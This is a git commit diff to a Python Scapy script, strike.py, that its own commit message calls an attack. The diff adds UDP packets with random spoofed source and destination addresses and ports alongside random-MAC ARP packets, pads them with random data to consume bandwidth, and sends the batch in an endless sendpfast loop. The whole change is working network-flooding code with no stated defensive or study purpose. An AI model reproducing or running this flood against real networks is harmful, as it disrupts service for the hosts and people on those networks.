fee5692cd84764f1b23fa5199218dd6ce97e76ac
Tacm4n <dqtran@cpp.edu>
2018-08-06 20:29:06 -0400

    Generates UDP and ARP based attack

--- strike.py
+++ strike.py
@@ -12,18 +12,22 @@ IP_layer=IP(src=RandIP(),dst=RandIP())
 #Arp later with random MACs and IPs
 Arp_layer=ARP(hwsrc=RandMAC(),hwdst=RandMAC(), pdst=RandIP(), psrc=RandIP())
 #UDP layer with random
-UDP_layer
+UDP_layer=UDP(sport=random.randint(1,66535),dport=random.randint(1,66535))
 #Main content, randomized and inserted to consume bandwidth
-Raw_content=Raw(load=RandString(size=65400))
-
+Raw_content=Raw(load=RandString(size=1450))
 
 #start a list holding the attack packets
 strike=[]
 #generate 10000 packets
-for pktNum in range(0,10000):
+for pktNum in range(0,1000):
 #Use the ethernet and arp layer to generate a packet
 	ARP_Strike=Eth_layer/Arp_layer/Raw_content
-
+	UDP_Strike=Eth_layer/IP_layer/UDP_layer/Raw_content
 #append packets to the list
 	strike.append(ARP_Strike)
-sendpfast(strike)
+	strike.append(UDP_Strike)
+try:
+	while 1:
+		sendpfast(strike)
+except KeyboardInterrupt: 
+	print ("User interruption")
